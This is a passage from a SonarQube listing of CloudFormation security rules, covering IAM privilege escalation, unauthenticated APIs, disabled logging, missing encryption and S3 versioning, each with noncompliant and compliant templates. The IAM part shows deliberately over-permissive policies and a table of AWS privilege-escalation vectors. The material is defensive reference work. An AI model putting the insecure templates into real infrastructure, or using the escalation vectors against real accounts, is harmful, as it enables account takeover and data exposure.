            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Privilege escalation generally happens when an identity policy gives an identity the ability to grant more privileges than the ones it already has.
Here is another example of a policy document that hides a privilege escalation. It allows an identity to generate a new access key for any user from
the account, including users with high privileges.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;*&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Although it looks like it grants a limited set of permissions, this policy would, in practice, give the highest privileges to the identity it’s
attached to.</p>
<p>Privilege escalation is a serious issue as it allows a malicious user to easily escalate to a high privilege identity from a low privilege identity
it took control of.</p>
<p>The example above is just one of many permission escalation vectors. Here is the list of vectors that the rule can detect:</p>
Vector nameSummary<p>Create Policy Version</p><p>Create a new IAM policy and set it as default</p><p>Set Default Policy Version</p><p>Set a different IAM policy version as default</p><p>Create AccessKey</p><p>Create a new access key for any user</p><p>Create Login Profile</p><p>Create a login profile with a password chosen by the attacker</p><p>Update Login Profile</p><p>Update the existing password with one chosen by the attacker</p><p>Attach User Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a user the attacker controls</p><p>Attach Group Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a group containing a user the attacker controls</p><p>Attach Role Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a role that can be assumed by the user the attacker controls</p><p>Put User Policy</p><p>Alter the existing inline IAM policy from a user the attacker controls</p><p>Put Group Policy</p><p>Alter the existing inline IAM policy from a group containing a user that the attacker controls</p><p>Put Role Policy</p><p>Alter an existing inline IAM role policy. The rule will then be assumed by the user that the attacker controls</p><p>Add User to Group</p><p>Add a user that the attacker controls to a group that has a larger range of permissions</p><p>Update Assume Role Policy</p><p>Update a role’s &#34;AssumeRolePolicyDocument&#34; to allow a user the attacker controls to assume it</p><p>EC2</p><p>Create an EC2 instance that will execute with high privileges</p><p>Lambda Create and Invoke</p><p>Create a Lambda function that will execute with high privileges and invoke it</p><p>Lambda Create and Add Permission</p><p>Create a Lambda function that will execute with high privileges and grant permission to invoke it to a user or a service</p><p>Lambda triggered with an external event</p><p>Create a Lambda function that will execute with high privileges and link it to an external event</p><p>Update Lambda code</p><p>Update the code of a Lambda function executing with high privileges</p><p>CloudFormation</p><p>Create a CloudFormation stack that will execute with high privileges</p><p>Data Pipeline</p><p>Create a Pipeline that will execute with high privileges</p><p>Glue Development Endpoint</p><p>Create a Glue Development Endpoint that will execute with high privileges</p><p>Update Glue Dev Endpoint</p><p>Update the associated SSH key for the Glue endpoint</p>
<p>The general recommendation to protect against privilege escalation is to restrict the resources to which sensitive permissions are granted. The
first example above is a good demonstration of sensitive permissions being used with a narrow scope of resources and where no privilege escalation is
possible.</p>
<h3>Noncompliant code example</h3>
<p>This policy allows to update the code of any lambda function. Updating the code of a lambda executing with high privileges will lead to privilege
escalation.</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09

Resources:
  # Update Lambda code
  lambdaUpdatePolicy:
    # Noncompliant
    Type: AWS::IAM::ManagedPolicy
    Properties:
      ManagedPolicyName: lambdaUpdatePolicy
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Allow
            Action:
              - lambda:UpdateFunctionCode
            Resource: &#34;*&#34;
</pre>
<h3>Compliant solution</h3>
<p>Narrow the policy to only allow to update the code of certain lambda functions.</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09

Resources:
  # Update Lambda code
  lambdaUpdatePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
      ManagedPolicyName: lambdaUpdatePolicy
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Allow
            Action:
              - lambda:UpdateFunctionCode
            Resource: &#34;arn:aws:lambda:us-east-2:123456789012:function:my-function:1&#34;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="nofollow">Rhino Security Labs</a> - AWS IAM Privilege Escalation
  – Methods and Mitigation </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6333">
              cloudformation:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br /> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The underlying API exposes all of its contents to any anonymous Internet user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul><li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li><li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li><li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li></ul>
<h2>Sensitive Code Example</h2>
<p>A public API that doesn’t have access control implemented:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      AuthorizationType: NONE # Sensitive
      HttpMethod: GET
</pre>
<p>A Serverless Application Model (SAM) API resource that is public by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleApi: # Sensitive
    Type: AWS::Serverless::Api
    Properties:
      StageName: Prod
</pre>
<h2>Compliant Solution</h2>
<p>An API that implements AWS IAM permissions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      AuthorizationType: AWS_IAM
      HttpMethod: GET
</pre>
<p>A Serverless Application Model (SAM) API resource that has to be requested using a key:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleApi:
    Type: AWS::Serverless::Api
    Properties:
      StageName: Prod
      Auth:
        ApiKeyRequired: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html" rel="nofollow">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6258">
              cloudformation:S6258
            </a>
          </td>
          <td>
            <details>
              <p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require this component to be monitored. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage
components.<br /> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load
Balancer Access Logs <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html" rel="nofollow">require an additional
bucket policy</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/s3/" rel="nofollow">Amazon S3 access requests</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;mynoncompliantbucket&#34;
</pre>
<p>For <a href="https://aws.amazon.com/api-gateway/" rel="nofollow">Amazon API Gateway</a> stages:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Prod: # Sensitive
    Type: AWS::ApiGateway::Stage
    Properties:
      StageName: Prod
      Description: Prod Stage
      TracingEnabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/neptune/" rel="nofollow">Amazon Neptune</a> clusters:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Cluster:
    Type: AWS::Neptune::DBCluster
    Properties:
      EnableCloudwatchLogsExports: []  # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> broker logs:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  SensitiveCluster:
    Type: &#39;AWS::MSK::Cluster&#39;
    Properties:
      ClusterName: Sensitive Cluster
      LoggingInfo:
        BrokerLogs: # Sensitive
          CloudWatchLogs:
            Enabled: false
            LogGroup: CWLG
          Firehose:
            DeliveryStream: DS
            Enabled: false
</pre>
<p>For <a href="https://aws.amazon.com/documentdb/" rel="nofollow">Amazon DocDB</a>:</p>
<pre>
AWSTemplateFormatVersion: &#34;2010-09-09&#34;
Resources:
  DocDBOmittingLogs: # Sensitive
    Type: &#34;AWS::DocDB::DBCluster&#34;
    Properties:
      DBClusterIdentifier : &#34;DB Without Logs&#34;
</pre>
<p>For <a href="https://aws.amazon.com/amazon-mq/" rel="nofollow">Amazon MQ</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Broker:
    Type: AWS::AmazonMQ::Broker
    Properties:
      Logs:  # Sensitive
        Audit: false
        General: false
</pre>
<p>For <a href="https://aws.amazon.com/redshift/" rel="nofollow">Amazon Redshift</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ClusterOmittingLogging: # Sensitive
    Type: &#34;AWS::Redshift::Cluster&#34;
    Properties:
      DBName: &#34;Redshift Warehouse Cluster&#34;
</pre>
<p>For <a href="https://aws.amazon.com/opensearch-service/" rel="nofollow">Amazon OpenSearch</a> service or Amazon Elasticsearch service:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  OpenSearchServiceDomain:
    Type: &#39;AWS::OpenSearchService::Domain&#39;
    Properties:
      LogPublishingOptions: # Sensitive
        ES_APPLICATION_LOGS:
          CloudWatchLogsLogGroupArn: &#39;arn:aws:logs:us-east-1:1234:log-group:es-application-logs&#39;
          Enabled: true
        INDEX_SLOW_LOGS:
          CloudWatchLogsLogGroupArn: &#39;arn:aws:logs:us-east-1:1234:log-group:es-index-slow-logs&#39;
          Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/cloudfront/" rel="nofollow">Amazon CloudFront</a> distributions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CloudFrontDistribution: # Sensitive
    Type: AWS::CloudFront::Distribution
    Properties:
      DistributionConfig:
        DefaultRootObject: &#34;index.html&#34;
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/" rel="nofollow">Amazon Elastic Load Balancing</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  LoadBalancer:
      Type: AWS::ElasticLoadBalancing::LoadBalancer
      Properties:
        AccessLoggingPolicy:
          Enabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/" rel="nofollow">Amazon Load Balancing (v2)</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ApplicationLoadBalancer:
   Type: AWS::ElasticLoadBalancingV2::LoadBalancer
   Properties:
     Name: CompliantLoadBalancer
     LoadBalancerAttributes:
       - Key: &#34;access_logs.s3.enabled&#34;
         Value: false # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/s3/" rel="nofollow">Amazon S3 access requests</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketLogs:
    Type: &#39;AWS::S3::Bucket&#39;
    Properties:
      BucketName: &#34;mycompliantloggingbucket&#34;
      AccessControl: LogDeliveryWrite

  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39;
    Properties:
      BucketName: &#34;mycompliantbucket&#34;
      LoggingConfiguration:
        DestinationBucketName: !Ref S3BucketLogs
        LogFilePrefix: testing-logs
</pre>
<p>For <a href="https://aws.amazon.com/api-gateway/" rel="nofollow">Amazon API Gateway</a> stages:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Prod:
    Type: AWS::ApiGateway::Stage
    Properties:
      StageName: Prod
      Description: Prod Stage
      TracingEnabled: true
      AccessLogSetting:
        DestinationArn: &#34;arn:aws:logs:eu-west-1:123456789:test&#34;
        Format: &#34;...&#34;
</pre>
<p>For <a href="https://aws.amazon.com/neptune/" rel="nofollow">Amazon Neptune</a> clusters:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Cluster:
    Type: AWS::Neptune::DBCluster
    Properties:
      EnableCloudwatchLogsExports: [&#34;audit&#34;]
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> broker logs:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  SensitiveCluster:
    Type: &#39;AWS::MSK::Cluster&#39;
    Properties:
      ClusterName: Sensitive Cluster
      LoggingInfo:
        BrokerLogs:
          Firehose:
            DeliveryStream: DS
            Enabled: true
          S3:
            Bucket: Broker Logs
            Enabled: true
            Prefix: &#34;logs/msk-brokers-&#34;
</pre>
<p>For <a href="https://aws.amazon.com/documentdb/" rel="nofollow">Amazon DocDB</a>:</p>
<pre>
AWSTemplateFormatVersion: &#34;2010-09-09&#34;
Resources:
  DocDBWithLogs:
    Type: &#34;AWS::DocDB::DBCluster&#34;
    Properties:
      DBClusterIdentifier : &#34;DB With Logs&#34;
      EnableCloudwatchLogsExports:
         - audit
</pre>
<p>For <a href="https://aws.amazon.com/amazon-mq/" rel="nofollow">Amazon MQ</a> enable <code>Audit</code> or <code>General</code>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Broker:
    Type: AWS::AmazonMQ::Broker
    Properties:
      Logs:
        Audit: true
        General: true
</pre>
<p>For <a href="https://aws.amazon.com/redshift/" rel="nofollow">Amazon Redshift</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CompliantCluster:
    Type: &#34;AWS::Redshift::Cluster&#34;
    Properties:
      DBName: &#34;Redshift Warehouse Cluster&#34;
      LoggingProperties:
        BucketName: &#34;Infra Logs&#34;
        S3KeyPrefix: &#34;log/redshift-&#34;
</pre>
<p>For <a href="https://aws.amazon.com/opensearch-service/" rel="nofollow">Amazon OpenSearch</a> service, or Amazon Elasticsearch service:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  OpenSearchServiceDomain:
    Type: &#39;AWS::OpenSearchService::Domain&#39;
    Properties:
      LogPublishingOptions:
        AUDIT_LOGS:
          CloudWatchLogsLogGroupArn: &#39;arn:aws:logs:us-east-1:1234:log-group:es-audit-logs&#39;
          Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/cloudfront/" rel="nofollow">Amazon CloudFront</a> distributions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CloudFrontDistribution:
    Type: AWS::CloudFront::Distribution
    Properties:
      DistributionConfig:
        DefaultRootObject: &#34;index.html&#34;
        Logging:
          Bucket: &#34;mycompliantbucket&#34;
          Prefix: &#34;log/cloudfront-&#34;
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/" rel="nofollow">Amazon Elastic Load Balancing</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  LoadBalancer:
      Type: AWS::ElasticLoadBalancing::LoadBalancer
      Properties:
        AccessLoggingPolicy:
          Enabled: true
          S3BucketName: mycompliantbucket
          S3BucketPrefix: &#34;log/loadbalancer-&#34;
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/" rel="nofollow">Amazon Load Balancing (v2)</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ApplicationLoadBalancer:
   Type: AWS::ElasticLoadBalancingV2::LoadBalancer
   Properties:
     Name: CompliantLoadBalancer
     LoadBalancerAttributes:
       - Key: &#34;access_logs.s3.enabled&#34;
         Value: true
       - Key: &#34;access_logs.s3.bucket&#34;
         Value: &#34;mycompliantbucket&#34;
       - Key: &#34;access_logs.s3.prefix&#34;
         Value: &#34;log/elbv2-&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html" rel="nofollow">AWS Documentation</a> - Logging requests using server access
  logging </li><li> <a href="https://cwe.mitre.org/data/definitions/778" rel="nofollow">MITRE, CWE-778</a> - Insufficient Logging </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6319">
              cloudformation:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The instance contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html" rel="nofollow">AWS::SageMaker::NotebookInstance</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Notebook:  # Sensitive, encryption disabled by default
    Type: AWS::SageMaker::NotebookInstance
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html" rel="nofollow">AWS::SageMaker::NotebookInstance</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Notebook:
    Type: AWS::SageMaker::NotebookInstance
    Properties:
      KmsKeyId:
        Fn::GetAtt:
          - SomeKey
          - KeyId
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html" rel="nofollow">Protect Data at Rest Using Encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6330">
              cloudformation:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The queue contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html" rel="nofollow">AWS::SQS::Queue</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Queue:  # Sensitive, encryption disabled by default
    Type: AWS::SQS::Queue
    Properties:
      DisplayName: &#34;unencrypted_queue&#34;
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html" rel="nofollow">AWS::SQS::Queue</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Queue:
    Type: AWS::SQS::Queue
    Properties:
      DisplayName: &#34;encrypted_queue&#34;
      KmsMasterKeyId:
        Fn::GetAtt:
          - TestKey
          - KeyId
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html" rel="nofollow">AWS Documentation</a> -
  Encryption at rest </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6275">
              cloudformation:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" rel="nofollow">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The disk contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html" rel="nofollow">AWS::EC2::Volume</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume
    Properties:
      Encrypted: false  # Sensitive
</pre>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume  # Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html" rel="nofollow">AWS::EC2::Volume</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume
    Properties:
      Encrypted: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html" rel="nofollow">Amazon EBS encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6252">
              cloudformation:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be in three states related to versioning:</p>
<ul><li> unversioned (default one) </li><li> enabled </li><li> suspended </li></ul>
<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;Example&#34;
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Compliant
    Properties:
      BucketName: &#34;Example&#34;
      VersioningConfiguration:
        Status: Enabled
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html" rel="nofollow">AWS documentation</a> - Using versioning in S3 buckets </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6332">
              cloudformation:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file system contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
